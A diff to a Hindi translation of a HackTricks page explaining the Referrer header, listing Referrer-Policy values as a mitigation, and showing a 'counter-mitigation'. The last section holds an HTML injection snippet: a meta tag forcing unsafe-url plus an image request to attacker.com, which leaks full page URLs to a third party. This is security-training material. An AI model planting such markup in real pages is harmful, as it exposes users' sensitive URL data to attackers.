@@ -1,6 +1,6 @@
 {{#include ../banners/hacktricks-training.md}}
 
-# Referrer हेडर और नीति
+# Referrer headers and policy
 
 Referrer वह हेडर है जिसका उपयोग ब्राउज़रों द्वारा यह संकेत करने के लिए किया जाता है कि कौन सा पिछला पृष्ठ देखा गया था।
 
@@ -10,7 +10,7 @@ Referrer वह हेडर है जिसका उपयोग ब्रा
 
 ## शमन
 
-आप ब्राउज़र को एक **Referrer-policy** का पालन करने के लिए कह सकते हैं जो **संवेदनशील जानकारी** को अन्य वेब अनुप्रयोगों को भेजने से **रोक** सकती है:
+आप ब्राउज़र को एक **Referrer-policy** का पालन करने के लिए कह सकते हैं जो **संवेदनशील जानकारी** को अन्य वेब अनुप्रयोगों में भेजने से **बचा** सकता है:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -21,9 +21,9 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-## Counter-Mitigation
+## काउंटर-निवारण
 
-आप इस नियम को एक HTML मेटा टैग का उपयोग करके ओवरराइड कर सकते हैं (हमलावर को एक HTML इंजेक्शन का लाभ उठाने की आवश्यकता है):
+आप इस नियम को एक HTML मेटा टैग का उपयोग करके ओवरराइड कर सकते हैं (हमलावर को एक HTML इंजेक्शन का शोषण करने की आवश्यकता है):
 ```markup
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
